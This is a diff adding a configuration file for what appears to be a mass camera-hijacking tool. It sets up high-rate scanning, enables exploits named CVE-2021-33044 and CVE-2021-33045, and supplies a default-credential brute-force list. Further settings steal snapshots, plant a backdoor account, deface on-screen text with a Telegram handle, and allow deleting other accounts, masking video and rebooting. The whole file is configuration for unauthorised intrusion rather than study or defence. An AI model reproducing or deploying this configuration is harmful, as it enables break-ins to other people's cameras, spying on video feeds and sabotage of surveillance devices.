@@ -1,0 +1,87 @@
+[scan]
+timeout = 5000              # Connection timeout (ms)
+retries = 3                  # Retries on connect
+generate = 1048576           # Generate s/n from prefix
+nurses = 200                 # parallel probe workers
+governor = true              # rate limiting
+maxrps = 2000                # requests per second cap
+
+[pwn]
+protocol.cgi = true          # web interface
+protocol.sdk = true          # port 37777 SDK
+protocol.type1 = true         # type 1 (old Chinese OEM)
+methods.brute = true
+methods.cve-2021-33044 = true
+methods.cve-2021-33045 = true
+methods.uau = true
+methods.antinuke = true
+
+[image]
+snapshot = true              # JPEG per device
+cgi = true                   # try CGI snapshot
+sdk = true                   # try SDK snapshot
+rtsp = true                  # try RTSP snapshot
+
+[brute]
+type1.delay = 20
+credentials = [
+ { login = "admin", password = "admin" },
+ { login = "admin", password = "admin123" },
+ { login = "admin", password = "admin12345" },
+ { login = "admin", password = "admin123456" },
+ { login = "admin", password = "admin1234" },
+ { login = "admin", password = "Admin123" },
+ { login = "admin", password = "Admin@123" },
+ { login = "admin", password = "123456" },
+ { login = "admin", password = "12345" },
+ { login = "admin", password = "12345678" },
+ { login = "admin", password = "P@ssw0rd" },
+ { login = "admin", password = "password" },
+ { login = "admin", password = "qwerty123" },
+ { login = "admin", password = "1qaz2wsx" },
+ { login = "admin", password = "admin2024" },
+ { login = "admin", password = "Dahua123" },
+ { login = "admin", password = "Dahua@123" },
+ { login = "admin", password = "Admin.123" },
+ { login = "admin", password = "112233video" },
+ { login = "admin", password = "admin888" },
+ { login = "666666", password = "666666" },
+ { login = "888888", password = "888888" },
+ { login = "888888", password = "88888888" },
+ { login = "user", password = "user" },
+ { login = "service", password = "service" },
+ { login = "guest", password = "guest" },
+]
+
+[dummy]
+login = "thebadinteger"            # 5-32 alnum
+password = "welovep2pwn"           # 8-32 alnum
+memo = "skver303"
+
+[overlay]
+osd = true
+channel = "ratkown"           # channel rename
+color_mode = "rainbow"         # colorful osd text (on old devices)
+custom = [
+    "t.me/ratkown",
+    "second line",               # you can do only 5 slots
+    "hello world!"                
+]
+
+# {s/n} - s/n on osd
+# {model} - model on osd
+# {firmware} - firmware on osd
+# {quote} - quote from quote.txt 
+# {random} - random 8 characters
+# {serial_prefix} - serial prefix
+# {date} - current date
+# {time} - current time
+
+[nuke]
+delete = false  # remove foreign accounts
+video = 0       # don't touch brightness
+box = false
+disable = false
+mask_front = [0, 0, 0, 255]  # black solid
+mask_back = [0, 0, 0, 0]
+reboot = false
